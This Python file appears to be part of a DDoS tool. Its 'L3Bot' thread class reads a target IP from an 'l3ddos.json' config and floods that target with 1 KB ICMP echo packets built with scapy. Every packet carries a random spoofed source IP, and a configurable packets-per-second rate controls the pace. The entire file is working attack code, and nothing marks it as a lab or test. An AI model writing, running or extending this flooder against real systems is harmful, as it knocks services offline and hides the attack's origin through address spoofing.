import threading, time
from pathlib import Path
from utils.utils import load_json
from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send
from scapy.volatile import RandIP, RandShort

ddos_config = load_json(Path(__file__).resolve().parents[2] / "config/l3ddos.json")
TARGET_IP = ddos_config["l3"]["TARGET_IP"]


class L3Bot(threading.Thread):
    def __init__(self, stop_time: int, num: int, pps: int | None):
        super().__init__()
        self.target_ip = TARGET_IP
        self.stop_time = stop_time
        self.pps = pps
        self.name = f"bot{num}"
        self.local_packets_sent = 0
        self.local_errors_count = 0
        self.local_bytes_sent = 0

    def run(self):
        payload = b'X' * 1024

        while time.time() < self.stop_time:
            try:
                packet = IP(dst=self.target_ip, src=RandIP()) /\
                         ICMP(type=8, code=0) /\
                         payload
                send(packet, verbose=0)
                self.local_packets_sent += 1
                self.local_bytes_sent += len(packet)
                if(self.pps):
                    time.sleep(1.0 / self.pps)
            except Exception:
                self.local_errors_count += 1